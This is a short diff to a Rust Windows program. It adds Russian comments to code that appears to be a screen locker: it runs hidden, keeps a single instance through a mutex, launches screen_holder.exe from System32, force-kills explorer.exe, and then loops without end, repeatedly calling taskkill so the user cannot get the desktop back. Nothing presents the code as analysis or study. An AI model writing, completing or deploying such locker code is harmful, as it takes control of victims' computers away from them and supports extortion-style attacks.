@@ -1,4 +1,5 @@
 #![windows_subsystem = "windows"]
+
 use std::process::Command;
 use std::thread;
 use std::time::Duration;
@@ -11,6 +12,7 @@ use std::ptr::null_mut;
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
 fn main() {
+    // Проверка на уже запущенный экземпляр
     unsafe {
         let mutex_name: Vec<u16> = "GATE_LOCK_MUTEX\0".encode_utf16().collect();
         let m = CreateMutexW(null_mut(), 1, mutex_name.as_ptr());
@@ -25,14 +27,17 @@ fn main() {
     let sys = std::env::var("SYSTEMROOT").unwrap() + "\\System32";
     let screen_path = format!("{}\\screen_holder.exe", sys);
 
+    // Запускаем screen_holder
     let _ = Command::new(&screen_path)
         .creation_flags(CREATE_NO_WINDOW)
         .spawn();
 
+    // Убиваем explorer
     let _ = Command::new("taskkill")
         .args(["/f", "/im", "explorer.exe"])
         .status();
 
+    // Бесконечный цикл блокировки
     loop {
         thread::sleep(Duration::from_secs(1));
         let _ = Command::new("taskkill")
